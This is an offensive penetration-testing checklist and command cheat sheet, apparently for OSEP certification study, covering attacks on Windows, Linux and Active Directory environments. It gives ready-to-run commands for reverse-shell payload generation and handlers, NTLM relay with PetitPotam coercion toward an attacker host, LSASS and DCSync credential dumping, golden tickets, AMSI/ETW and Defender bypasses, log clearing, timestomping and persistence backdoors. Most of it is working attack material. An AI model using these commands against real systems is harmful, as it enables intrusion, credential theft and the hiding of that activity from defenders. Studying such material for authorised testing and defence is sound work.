# ChecklistChecklist

## OSEP Penetration Testing Checklist

***

### Phase 1 — Reconnaissance

#### Network & Port Scanning

* \[ ] Full port scan (nmap -p- --min-rate 5000 -Pn \<target>)
* \[ ] Service version detection (nmap -sV -sC -p \<ports>)
* \[ ] UDP scan top ports (nmap -sU --top-ports 20)
* \[ ] OS fingerprinting (nmap -O)
* \[ ] Identify domain controllers (port 88, 389, 636, 3268)
* \[ ] Identify web servers (port 80, 443, 8080, 8443)
* \[ ] Identify SQL servers (port 1433)
* \[ ] Identify RDP servers (port 3389)
* \[ ] Identify WinRM (port 5985, 5986)
* \[ ] Identify SMTP / mail servers (port 25, 587)
* \[ ] Mass port scan for large ranges (masscan -p1-65535 --rate=1000)

#### Directory & Web Enumeration

* \[ ] Directory brute-force (gobuster dir -u \<url> -w /usr/share/wordlists/dirb/common.txt)
* \[ ] Extended wordlist scan (gobuster dir -u \<url> -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt)
* \[ ] Virtual host enumeration (ffuf -u http://IP -H "Host: FUZZ.domain.com" -w subdomains.txt)
* \[ ] Technology fingerprinting (whatweb, wappalyzer)
* \[ ] Check for .NET/IIS usage (view page source for .aspx, X-Powered-By headers)
* \[ ] Check for file upload endpoints
* \[ ] Check for login portals and default credentials
* \[ ] Check robots.txt, sitemap.xml, .git exposure
* \[ ] Enumerate API endpoints (ffuf, kiterunner)

#### Identity & Protocol Mapping

* \[ ] SMB enumeration (enum4linux -a \<target>, crackmapexec smb \<target>)
* \[ ] LDAP anonymous bind (ldapsearch -x -H ldap://\<DC> -b "dc=domain,dc=com")
* \[ ] LDAP enumeration with creds (windapsearch, ldapdomaindump)
* \[ ] Kerberos user enumeration (kerbrute userenum --dc \<DC> -d domain.com users.txt)
* \[ ] Check SMB signing status (crackmapexec smb \<range> --gen-relay-list relay\_targets.txt)
* \[ ] Check NTLM authentication endpoints
* \[ ] FTP anonymous access check
* \[ ] SPN enumeration (setspn -T \<domain> -Q _/_)
* \[ ] SPN enumeration PowerShell (Get-DomainUser -SPN | select samaccountname,serviceprincipalname)
* \[ ] ASREPRoastable users (Get-DomainUser -PreauthNotRequired)
* \[ ] BloodHound data collection (SharpHound.exe -c All, bloodhound-python -c All)
* \[ ] Foreign group membership (Get-DomainForeignGroupMember)
* \[ ] Forest trust enumeration (nltest /trusted\_domains, Get-ForestTrust)
* \[ ] AD trust enumeration (.NET GetAllTrustRelationships)

#### Infrastructure Mapping

* \[ ] Identify jump hosts / bastion servers
* \[ ] Identify CI/CD pipelines (Jenkins, GitLab, GitHub Actions)
* \[ ] Identify PKI / ADCS servers (certutil -config - -ping, certipy find)
* \[ ] Identify management planes (SCCM, SCOM, Ansible, Puppet)
* \[ ] Identify SQL Server instances (setspn, PowerUpSQL Get-SQLInstanceDomain)
* \[ ] Linked SQL server enumeration (Get-SQLServerLink, sp\_linkedservers)
* \[ ] Ansible infrastructure detection (ansible --version, /etc/ansible, inventory files)
* \[ ] Artifactory detection (/opt/jfrog/artifactory, port 8081/8082)
* \[ ] Identify LAPS deployment (Get-DomainComputer | select name,ms-mcs-admpwd)
* \[ ] Identify gMSA accounts (Get-ADServiceAccount -Filter \*)

#### Network Filter Assessment

* \[ ] Test DNS filtering (nslookup via 8.8.8.8 vs internal resolver)
* \[ ] Verify domain reputation (VirusTotal, IPVoid, urlscan.io)
* \[ ] Check web proxy presence (HTTP headers, WPAD)
* \[ ] Test HTTPS inspection (check TLS certificate issuer)
* \[ ] Identify CDN frontable domains (FindFrontableDomains.py)
* \[ ] Test egress filtering (allowed ports outbound)
* \[ ] Test DNS tunneling viability (dnscat2 test)
* \[ ] Check for full packet capture / IDS presence

***

### Phase 2 — Initial Access

#### Web Application Attacks

* \[ ] File upload exploitation → ASPX web shell (msfvenom -p windows/x64/meterpreter/reverse\_https -f aspx)
* \[ ] SQL injection (manual testing, sqlmap --level=5 --risk=3)
* \[ ] Authentication bypass (logic flaws, default creds, password spray)
* \[ ] SSRF / XXE exploitation
* \[ ] Command injection (OS command, template injection)
* \[ ] Local/Remote file inclusion (LFI/RFI)
* \[ ] ASPX Meterpreter shell upload and trigger

#### Phishing & Client-Side — Office Macros

* \[ ] VBA macro shellcode runner (VirtualAlloc, RtlMoveMemory, CreateThread)
* \[ ] VBA download cradle (PowerShell WebClient)
* \[ ] VBA auto-execute (Document\_Open, AutoOpen)
* \[ ] VBA text substitution obfuscation ("decryption" trick)
* \[ ] StrReverse obfuscation in VBA
* \[ ] VBA Caesar cipher encryption/decryption
* \[ ] VBA stomping (P-code manipulation with FlexHEX)
* \[ ] HTML smuggling (Base64 → Blob, createObjectURL, auto-download)
* \[ ] PowerShell reflection runner (LookupFunc, getDelegateType)
* \[ ] PowerShell download cradle from VBA (CreateObject Wscript.Shell)

#### Phishing & Client-Side — JScript / HTA

* \[ ] JScript dropper (MSXML2.XMLHTTP, ADODB.Stream)
* \[ ] C# shellcode runner via JScript (DotNetToJScript, ExampleAssembly.dll)
* \[ ] JScript AMSI bypass (registry AmsiEnable=0 via JScript)
* \[ ] HTA file execution (mshta.exe)
* \[ ] XSL transform execution (wmic /format:\<malicious.xsl>)
* \[ ] SharpShooter payload generation

#### AppLocker Bypass

* \[ ] Identify AppLocker policy (Get-AppLockerPolicy -Effective)
* \[ ] Bypass via trusted folder (C:\Windows\Tasks, C:\Windows\Temp)
* \[ ] Bypass via InstallUtil.exe
* \[ ] Bypass via Microsoft.Workflow.Compiler.exe
* \[ ] Bypass via mshta.exe + HTA
* \[ ] Bypass via wmic XSL transforms
* \[ ] Bypass via custom runspaces (CLM bypass, PowerShell -version 2)
* \[ ] Bypass via regsvr32 (scrobj.dll, COM scriptlet)

#### Evasion for Initial Access

* \[ ] AV signature evasion (Find-AVSignature, byte modification)
* \[ ] Metasploit encoder (shikata\_ga\_nai, x64/zutto\_dekiru)
* \[ ] Metasploit encryptor (aes256, rc4, xor)
* \[ ] C# custom shellcode runner (VirtualAlloc, CreateThread)
* \[ ] Sleep timer heuristic bypass (Sleep + DateTime delta check)
* \[ ] Non-emulated API (VirtualAllocExNuma)
* \[ ] WMI de-chaining (GetObject winmgmts, Create method)
* \[ ] Custom SSL certificate (OpenSSL req, HandlerSSLCert in MSF)
* \[ ] Domain fronting (Azure CDN, HttpHostHeader)
* \[ ] DNS tunneling C2 (dnscat2, TXT records)
* \[ ] Reflective assembly loading (PowerShell Add-Type, \[Reflection.Assembly]::Load)

***

### Phase 3 — Privilege Escalation

#### Windows — Token & Service Abuse

* \[ ] Check current privileges (whoami /priv, whoami /all)
* \[ ] Token impersonation — SeImpersonatePrivilege (PrintSpooferNet, GodPotato, RoguePotato)
* \[ ] Named pipe impersonation (CreateNamedPipe, ImpersonateNamedPipeClient)
* \[ ] CreateProcessWithTokenW for SYSTEM shell
* \[ ] Weak service permissions (accesschk.exe, sc.exe sdshow)
* \[ ] Unquoted service paths (wmic service get name,pathname | findstr /i /v """")
* \[ ] AlwaysInstallElevated (MSI abuse, reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer)
* \[ ] UAC bypass — FodHelper (registry modification, no elevation prompt)
* \[ ] UAC bypass + stage encoding (EnableStageEncoding true in MSF)
* \[ ] DLL hijacking (missing DLLs, writable PATH)
* \[ ] LSA Protection bypass (mimidrv.sys, !processprotect /remove)
* \[ ] VirtualAllocExNuma + Caesar cipher (non-emulated API bypass)
* \[ ] Scheduled task abuse (schtasks /query /fo LIST /v)

#### Windows — AMSI & Defense Bypass

* \[ ] AMSI bypass — PowerShell (amsiContext reflection, amsiInitFailed)
* \[ ] AMSI bypass — JScript (registry AmsiEnable=0)
* \[ ] AMSI bypass — DLL hijack (wscript.exe side-load)
* \[ ] ETW patch (ntdll patch, EtwEventWrite nop)
* \[ ] Defender exclusion (Add-MpPreference -ExclusionPath C:\Windows\Tasks)
* \[ ] Disable AV via registry (if admin, DisableRealtimeMonitoring)
* \[ ] LOLBins for execution (certutil, bitsadmin, mshta, regsvr32)

#### Windows — Injection Techniques

* \[ ] Process injection (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
* \[ ] DLL injection (LoadLibraryA via CreateRemoteThread)
* \[ ] Reflective DLL injection (Invoke-ReflectivePEInjection.ps1)
* \[ ] Process hollowing (CreateProcess suspended, ZwQueryInformationProcess, NtUnmapViewOfSection)
* \[ ] Inject into high-integrity process (explorer.exe, svchost.exe)

#### Linux — Enumeration

* \[ ] Run linPEAS (./linpeas.sh | tee linpeas.out)
* \[ ] SUID binary enumeration (find / -perm -u=s -type f 2>/dev/null)
* \[ ] Sudo -l enumeration (check GTFOBins for allowed commands)
* \[ ] Writable cron jobs (/etc/cron\*, /var/spool/cron)
* \[ ] World-writable files and directories
* \[ ] Check /etc/passwd for writable entries
* \[ ] Check running processes for credentials (ps aux, /proc/\*/environ)
* \[ ] Check NFS exports (showmount -e, no\_root\_squash)
* \[ ] Check capabilities (getcap -r / 2>/dev/null)

#### Linux — Exploitation

* \[ ] VIM backdoor (.vimrc, autocmd VimEnter \* !command)
* \[ ] VIM keylogger (autocmd record to file)
* \[ ] Cron job exploitation (/etc/cron.hourly/, writable scripts)
* \[ ] SUID busybox privilege escalation
* \[ ] Shared library hijacking (LD\_LIBRARY\_PATH, constructor attribute)
* \[ ] LD\_PRELOAD hooking (geteuid hook, dlsym RTLD\_NEXT)
* \[ ] SSH key theft + passphrase cracking (ssh2john.py → John / Hashcat)
* \[ ] SSH ControlMaster hijacking (socket files in /tmp)
* \[ ] SSH-Agent forwarding hijack (SSH\_AUTH\_SOCK from /proc)
* \[ ] Ansible playbook injection (shell module, authorized\_keys task)
* \[ ] Artifactory database attack (Derby DB, ij tool, bcrypt crack)
* \[ ] Kiosk breakout (Firefox profile manager, GtkDialog, file manager)

#### Active Directory — Object Permission Abuse

* \[ ] Run BloodHound and identify attack paths (Shortest Path to DA)
* \[ ] GenericAll on user → password reset (Set-DomainUserPassword)
* \[ ] GenericAll on group → add member (Add-DomainGroupMember)
* \[ ] GenericWrite → targeted Kerberoasting or RBCD setup
* \[ ] WriteDACL → grant self GenericAll or DCSync rights
* \[ ] ForceChangePassword → reset without knowing old password
* \[ ] AdminSDHolder persistence via ACL write
* \[ ] AddMember → group membership escalation

#### ADCS / PKI Escalation

* \[ ] Enumerate ADCS (certipy find -u user -p pass -dc-ip \<DC>)
* \[ ] ESC1 — Enrollee supplies SAN (certipy req -template \<name> -upn admin@domain.com)
* \[ ] ESC2 — Any Purpose EKU abuse
* \[ ] ESC3 — Enrollment Agent abuse
* \[ ] ESC4 — Write permissions on template (modify EKU, enable SAN)
* \[ ] ESC6 — EDITF\_ATTRIBUTESUBJECTALTNAME2 flag set
* \[ ] ESC8 — NTLM relay to ADCS web enrollment (ntlmrelayx + PetitPotam)
* \[ ] Authenticate with certificate (certipy auth -pfx cert.pfx -dc-ip \<DC>)
* \[ ] PKINIT → retrieve NT hash (certipy auth outputs hash for PTH)

#### Kerberos Delegation Attacks

* \[ ] Unconstrained delegation enumeration (Get-DomainComputer -Unconstrained)
* \[ ] Unconstrained delegation + printer bug (SpoolSample → Rubeus monitor → ptt)
* \[ ] DCSync with captured DC TGT (lsadump::dcsync /user:krbtgt)
* \[ ] Constrained delegation enumeration (Get-DomainUser -TrustedToAuth)
* \[ ] S4U2Self + S4U2Proxy (Rubeus s4u /impersonateuser:administrator)
* \[ ] RBCD setup (New-MachineAccount + Set-DomainObject msds-allowedtoactonbehalfofotheridentity)
* \[ ] RBCD exploitation (Rubeus s4u from created machine account)

***

### Phase 4 — Post Exploitation

#### Situational Awareness

* \[ ] Run HostRecon.ps1 (system, domain, AV, network enumeration)
* \[ ] Current user context (whoami /all, net user %username% /domain)
* \[ ] Local admins (net localgroup administrators)
* \[ ] Domain admins and high-value groups (net group "Domain Admins" /domain)
* \[ ] Active sessions and logged-on users (qwinsta, net session)
* \[ ] Network interfaces and routes (ipconfig /all, route print)
* \[ ] Firewall rules (netsh advfirewall show allprofiles)
* \[ ] Running processes and services (tasklist /v, Get-Process)
* \[ ] Installed software and patches (wmic product, Get-HotFix)

#### Credential Harvesting — Windows

* \[ ] Mimikatz LSASS dump (privilege::debug, sekurlsa::logonpasswords)
* \[ ] Mimikatz minidump (sekurlsa::minidump lsass.dmp)
* \[ ] Custom LSASS dumper (C# MiniDumpWriteDump, ProcDump -accepteula -ma lsass)
* \[ ] SAM database dump (reg save HKLM\SAM, reg save HKLM\SYSTEM → pwdump.py)
* \[ ] SAM via VSS (vssadmin create shadow, copy SAM/SYSTEM/SECURITY)
* \[ ] LAPS password extraction (Get-LAPSComputers, Find-LAPSDelegatedGroups)
* \[ ] Kerberos ticket extraction (klist, Rubeus dump /luid, copy ccache)
* \[ ] Keytab creation (ktutil addent, ktutil wkt)
* \[ ] DCSync (mimikatz lsadump::dcsync /domain:\<domain> /user:krbtgt)
* \[ ] Golden ticket creation (mimikatz kerberos::golden /user:hax /krbtgt:HASH /sid:SID /ptt)
* \[ ] Golden ticket with ExtraSids (add /sids:S-1-5-21-\<forest>-519 for EA)
* \[ ] DPAPI credential decryption (mimikatz dpapi::cred, dpapi::masterkey)
* \[ ] Browser credential extraction (SharpWeb, mimikatz dpapi)
* \[ ] Credential Manager dump (cmdkey /list, mimikatz vault::cred)

#### Credential Harvesting — Linux

* \[ ] SSH private key collection (find /home /root -name id\_rsa 2>/dev/null)
* \[ ] SSH agent socket hijacking (ls /tmp/ssh-\*, SSH\_AUTH\_SOCK=/tmp/ssh-xxx ssh-add -l)
* \[ ] Kerberos ccache theft (ls /tmp/krb5cc\_\*, export KRB5CCNAME=; klist)
* \[ ] Ansible Vault crack (ansible2john.py vault → Hashcat mode 16900)
* \[ ] Artifactory user hash extraction (Derby DB, ij tool, SELECT from access\_users)
* \[ ] Process memory inspection (/proc/_/environ, /proc/_/cmdline)
* \[ ] History files (cat \~/.bash\_history, \~/.zsh\_history, \~/.mysql\_history)
* \[ ] Config file credential search (grep -r "password" /etc /var/www /opt 2>/dev/null)

#### Persistence

* \[ ] Registry run keys (HKLM\Software\Microsoft\Windows\CurrentVersion\Run)
* \[ ] Scheduled tasks (schtasks /create /tn "name" /tr payload /sc onlogon)
* \[ ] WMI event subscriptions (permanent subscriptions survive reboot)
* \[ ] Service installation (sc create name binPath= payload start= auto)
* \[ ] Golden / Silver ticket (long lifetime, no password change dependency)
* \[ ] SSH authorized\_keys insertion (echo pubkey >> \~/.ssh/authorized\_keys)
* \[ ] Linux .bashrc / .profile persistence
* \[ ] Linux VIM .vimrc backdoor

#### Evasion — Post-Exploitation

* \[ ] Log clearing (wevtutil cl Security, wevtutil cl System)
* \[ ] Timestomping (touch -r legit\_file backdoor, Set-ItemProperty -Name LastWriteTime)
* \[ ] ETW patching (ntdll EtwEventWrite patch)
* \[ ] Defender exclusion paths (Add-MpPreference -ExclusionPath)
* \[ ] Process migration for stability (migrate to explorer.exe / svchost.exe)
* \[ ] LOLBins execution (certutil -decode, bitsadmin /transfer)

***

### Phase 5 — Lateral Movement

#### Authentication-Based Pass Attacks

* \[ ] Pass-the-Hash (crackmapexec smb \<target> -u user -H HASH)
* \[ ] Pass-the-Hash RDP (xfreerdp /v:\<target> /u:user /pth:HASH /cert:ignore)
* \[ ] Pass-the-Ticket (Rubeus ptt /ticket:base64, mimikatz kerberos::ptt)
* \[ ] Over-Pass-the-Hash / Pass-the-Key (Rubeus asktgt /user:user /rc4:HASH)
* \[ ] Pass-the-Certificate (certipy auth, PKINIT)
* \[ ] Password spray (crackmapexec smb \<range> -u users.txt -p 'Password123')

#### Kerberos Attacks

* \[ ] Kerberoasting (Rubeus kerberoast, impacket-GetUserSPNs, hashcat -m 13100)
* \[ ] ASREPRoasting (Rubeus asreproast, impacket-GetNPUsers, hashcat -m 18200)
* \[ ] Silver ticket (targeted service, no DC communication)
* \[ ] Bronze bit attack (impacket ticketer, bypass PAC validation)
* \[ ] Kerberoasting → crack → lateral movement
* \[ ] Targeted Kerberoasting (set SPN via GenericWrite, then roast)

#### DACL / ACL Abuse

* \[ ] GenericWrite → targeted Kerberoasting / RBCD
* \[ ] WriteDACL → grant DCSync rights (Add-DomainObjectAcl -Rights DCSync)
* \[ ] GenericAll → full object control
* \[ ] ForceChangePassword → change without knowing current
* \[ ] AddMember → group membership escalation
* \[ ] AdminSDHolder persistence via ACL modification

#### Remote Execution — Windows

* \[ ] WMI (wmic /node:target process call create "cmd /c payload")
* \[ ] DCOM — MMC20.Application (CreateInstance, ExecuteShellCommand)
* \[ ] PsExec / PAExec (creates ADMIN$ service, requires SMB + admin)
* \[ ] SCShell fileless (OpenSCManager, ChangeServiceConfigA, StartService)
* \[ ] WinRM / PSRemoting (evil-winrm -i target -u user -H HASH)
* \[ ] SMBExec (impacket-smbexec, semi-interactive shell)
* \[ ] PrintSpooferNet fileless (modify SensorService binary path)
* \[ ] RDP Restricted Admin (enable: reg add DisableRestrictedAdmin /t REG\_DWORD /d 0)
* \[ ] RDP credential theft (RdpThief DLL injection into mstsc.exe)
* \[ ] Chisel RDP tunnel (server on attacker, client reverse port forward)

#### Remote Execution — Linux

* \[ ] SSH with stolen keys (ssh -i id\_rsa user@target)
* \[ ] SSH-Agent forwarding (AllowAgentForwarding, hop through agent)
* \[ ] SSH ControlMaster hijack (steal socket, ssh -S /tmp/ssh-sock target)
* \[ ] Ansible ad-hoc commands (ansible hosts -m shell -a "id" -i inventory)
* \[ ] Ansible playbook execution (ansible-playbook malicious.yml)

#### SQL Server Lateral Movement

* \[ ] UNC path injection (xp\_dirtree '\attacker\share', capture hash with Responder)
* \[ ] NTLM relay (impacket-ntlmrelayx -t smb://target -c "powershell -enc B64")
* \[ ] SQL impersonation (EXECUTE AS LOGIN = 'sa'; SELECT IS\_SRVROLEMEMBER('sysadmin'))
* \[ ] xp\_cmdshell enable (EXEC sp\_configure 'xp\_cmdshell', 1; RECONFIGURE)
* \[ ] xp\_cmdshell execute (EXEC xp\_cmdshell 'whoami')
* \[ ] sp\_OACreate + sp\_OAMethod (WScript.Shell, OLE Automation procedures)
* \[ ] Custom CLR assembly (CREATE ASSEMBLY, CREATE PROCEDURE cmdExec)
* \[ ] Linked SQL servers (OPENQUERY, SELECT \* FROM OPENQUERY(linked, 'SELECT 1'))
* \[ ] Nested linked server hops (AT clause chain)
* \[ ] PowerUpSQL automation (Get-SQLServerLink, Invoke-SQLEscalatePriv)

#### Process Injection — In-Memory

* \[ ] Standard injection (OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread)
* \[ ] DLL injection (LoadLibraryA pointer via CreateRemoteThread)
* \[ ] Reflective DLL injection (Invoke-ReflectivePEInjection.ps1)
* \[ ] Process hollowing (CreateProcess SUSPENDED → ZwQueryInformationProcess → NtUnmapViewOfSection → write + resume)

#### BloodHound-Driven Attack Planning

* \[ ] Collect with SharpHound / rusthound / bloodhound-python
* \[ ] Find shortest path to Domain Admin
* \[ ] Find AS-REP roastable users (no pre-auth required)
* \[ ] Find Kerberoastable users (SPNs set)
* \[ ] Find DCSync rights (Replicating Directory Changes All)
* \[ ] Find LAPS readers
* \[ ] Find computers with unconstrained delegation
* \[ ] Find cross-domain / cross-forest attack paths
* \[ ] Find owned-object reachable high-value targets

***

### Phase 6 — Forest Compromise

#### Trust Enumeration

* \[ ] Enumerate domain trusts (nltest /trusted\_domains)
* \[ ] Enumerate forest trusts (Get-ForestTrust, .NET Forest.GetAllTrustRelationships)
* \[ ] Identify trust direction (one-way / bidirectional / transitive)
* \[ ] Identify SID filtering status (sIDHistory enabled = riskier)
* \[ ] Cross-forest Kerberos ticket request (getTGT + kvno, Impacket)
* \[ ] Foreign group membership (Get-DomainForeignGroupMember)

#### Cross-Forest Attacks

* \[ ] SID history injection (mimikatz kerberos::golden /sids:\<target-forest-EA-SID>)
* \[ ] Extra SIDs in Golden Ticket (corp1\Enterprise Admins RID 519)
* \[ ] Cross-forest resource access via referral tickets
* \[ ] Printer bug across forest (SpoolSample → unconstrained delegation DC → TGT)
* \[ ] DCSync as remote forest DC machine account

#### Domain Controller Compromise

* \[ ] DCSync (secretsdump.py domain/user:pass@DC, mimikatz lsadump::dcsync)
* \[ ] NTDS.dit extraction (vssadmin create shadow, ntdsutil snapshot)
* \[ ] Golden Ticket creation (krbtgt hash → persist forever until krbtgt reset ×2)
* \[ ] Skeleton Key (mimikatz misc::skeleton, patches LSASS — non-persistent)
* \[ ] Zone transfer (dig axfr @DC domain.com)

***

### Phase 7 — Secret Compromise

#### PKI / ADCS

* \[ ] Certificate request as privileged user (certipy req -template \<vuln-template> -upn admin@domain)
* \[ ] Authenticate with certificate (certipy auth -pfx cert.pfx -dc-ip \<DC>)
* \[ ] PKINIT → NT hash retrieval (certipy auth outputs NT hash → PTH)
* \[ ] ESC8 NTLM relay to ADCS web enrollment (PetitPotam + ntlmrelayx + certipy)

#### Privileged Access

* \[ ] MSSQL sysadmin shell (xp\_cmdshell → reverse shell)
* \[ ] Jump host / bastion pivot (SSH tunnel, proxychains, Chisel)
* \[ ] HashiCorp / CyberArk Vault access (stolen tokens, API keys)
* \[ ] Cloud credential abuse (AWS \~/.aws/credentials, Azure tokens, env vars)
* \[ ] Artifactory admin backdoor (bootstrap.creds, restart service)
* \[ ] Kerberos keytab reuse (ktutil, kinit -k -t /etc/krb5.keytab principal)

#### Credential Stores

* \[ ] gMSA password hash retrieval (dsacls, mimikatz lsadump::gmsa)
* \[ ] LAPS password retrieval (Get-LAPSComputers — requires LAPS reader group)
* \[ ] Ansible Vault decryption (ansible-vault decrypt vault.yml)
* \[ ] Artifactory user database (Derby, SELECT \* FROM access\_users, bcrypt crack)
* \[ ] SSH private keys + passphrases (ssh2john.py → john → ssh -i key)
* \[ ] Kerberos keytab files (/tmp/krb5cc\_\*, /etc/krb5.keytab, klist -k)

***

### Tools Quick Reference

| Phase          | Tool                        | Purpose                             |
| -------------- | --------------------------- | ----------------------------------- |
| Recon          | nmap                        | Port and service scanning           |
| Recon          | gobuster / ffuf             | Web directory and vhost brute force |
| Recon          | kerbrute                    | Kerberos user enumeration           |
| Recon          | crackmapexec                | SMB/LDAP/WinRM enumeration          |
| Recon          | BloodHound + SharpHound     | AD attack path analysis             |
| Recon          | certipy find                | ADCS enumeration                    |
| Recon          | ldapdomaindump              | LDAP data extraction                |
| Recon          | FindFrontableDomains.py     | CDN domain fronting recon           |
| Initial Access | msfvenom                    | Payload generation                  |
| Initial Access | DotNetToJScript             | C# to JScript conversion            |
| Initial Access | SharpShooter                | Automated JScript payloads          |
| Initial Access | Find-AVSignature            | AV signature location               |
| PrivEsc        | winPEAS / linPEAS           | Automated local enumeration         |
| PrivEsc        | PrintSpooferNet / GodPotato | SeImpersonatePrivilege abuse        |
| PrivEsc        | certipy                     | ADCS ESC1–ESC8 exploitation         |
| PrivEsc        | Rubeus                      | Kerberos ticket abuse, delegation   |
| PrivEsc        | PowerView                   | AD object enumeration and abuse     |
| Post-Ex        | Mimikatz                    | Credential dumping, ticket forgery  |
| Post-Ex        | mimidrv.sys                 | LSA Protection bypass               |
| Post-Ex        | LAPSToolkit                 | LAPS password extraction            |
| Post-Ex        | HostRecon.ps1               | System situational awareness        |
| Post-Ex        | ProcDump                    | LSASS dump (signed MS binary)       |
| Lateral        | impacket suite              | Remote exec, auth, relay, DCSync    |
| Lateral        | evil-winrm                  | WinRM interactive shell             |
| Lateral        | PowerUpSQL                  | SQL Server attack automation        |
| Lateral        | SCShell                     | Fileless lateral movement           |
| Lateral        | RdpThief                    | RDP credential theft                |
| Lateral        | Chisel                      | TCP tunneling / port forwarding     |
| Lateral        | Responder                   | LLMNR/NBT-NS/NTLM capture           |
| Forest         | nltest / Get-ForestTrust    | Trust enumeration                   |
| Forest         | secretsdump.py              | DCSync / NTDS.dit dump              |
| Secrets        | certipy auth                | Certificate authentication          |
| Secrets        | impacket-mssqlclient        | MSSQL interactive access            |
| Secrets        | ssh2john + john             | SSH passphrase cracking             |

***

### Key Command Reference

#### Recon

```bash
# Port scanning
nmap -p- --min-rate 5000 -Pn -oN all_ports.txt <target>
nmap -sV -sC -p 22,80,443,445,1433,3389 -oN services.txt <target>

# SMB / LDAP
crackmapexec smb <range>/24 --gen-relay-list relay_targets.txt
ldapsearch -x -H ldap://<DC> -b "dc=domain,dc=com" "(objectClass=user)"

# Kerberos enumeration
kerbrute userenum --dc <DC> -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# SPN / trust
setspn -T corp.com -Q */*
nltest /trusted_domains
Get-DomainForeignGroupMember
```

#### Initial Access

```bash
# ASPX shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f aspx -o shell.aspx

# Domain-fronted payload
msfvenom -p windows/x64/meterpreter/reverse_https HttpHostHeader=cdn.domain.com LHOST=front.azure.com -f exe -o payload.exe

# MSF handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <IP>; set LPORT 443
set HandlerSSLCert /path/to/cert.pem
run
```

#### Privilege Escalation

```powershell
# Check privs
whoami /priv

# DACL abuse
Get-ObjectAcl -Identity "Domain Admins" | ConvertFrom-SID
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# RBCD
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
Set-DomainObject target-computer -Set @{'msds-allowedtoactonbehalfofotheridentity'=<SDDL>}
Rubeus.exe s4u /user:fake01$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/target /ptt

# ESC1
certipy req -u user@domain.com -p pass -ca CA-Name -template VulnTemplate -upn admin@domain.com
certipy auth -pfx cert.pfx -dc-ip <DC>
```

#### Post Exploitation

```powershell
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv

# LSASS dump (avoid AV)
Get-Process lsass | % { $p = [System.Diagnostics.Process]::GetProcessById($_.Id); ... }

# Linux SSH agent hijack
ls /tmp/ssh-*/agent.*
SSH_AUTH_SOCK=/tmp/ssh-XxXxXx/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XxXxXx/agent.1234 ssh user@next-target
```

#### Lateral Movement

```bash
# SCShell fileless
python3 scshell.py domain/user:pass@appsrv01 -c "powershell -enc <B64>"

# xfreerdp PTH
xfreerdp /v:target /u:Administrator /pth:<NTLM_HASH> /cert:ignore /dynamic-resolution

# SQL NTLM relay chain
impacket-ntlmrelayx -t mssql://sqlsrv -smb2support -q "EXEC xp_cmdshell 'whoami'"

# Kerberoasting
impacket-GetUserSPNs domain.com/user:pass -dc-ip <DC> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Forest Compromise

```powershell
# Monitor for DC TGT (unconstrained delegation)
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Golden ticket with ExtraSids
mimikatz # kerberos::golden /user:hax /domain:prod.corp.com /sid:<PROD-SID> /krbtgt:<HASH> /sids:<FOREST-EA-SID> /ptt

# DCSync remote forest
mimikatz # lsadump::dcsync /domain:target.forest.com /dc:dc01.target.forest.com /user:krbtgt
```

#### ADCS / Certificate Attacks

```bash
# Enumerate
certipy find -u user@domain.com -p pass -dc-ip <DC> -vulnerable -stdout

# ESC1 exploit
certipy req -u user@domain.com -p pass -ca Corp-CA -template VulnTemplate -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip <DC>

# ESC8 relay
impacket-ntlmrelayx -t http://<ADCS>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py <attacker_IP> <DC_IP>
```

***

### Mindset Checklist — Before Moving On

* \[ ] Do I have a stable, OPSEC-safe shell?
* \[ ] Have I dumped all local credentials before moving laterally?
* \[ ] Have I checked BloodHound for the optimal path (not just the first path)?
* \[ ] Have I verified SID filtering before attempting cross-forest attacks?
* \[ ] Have I captured the flag / target credential at this stage?
* \[ ] Have I documented the attack path for the report?
* \[ ] Do I know how to re-exploit this host if I lose my shell?
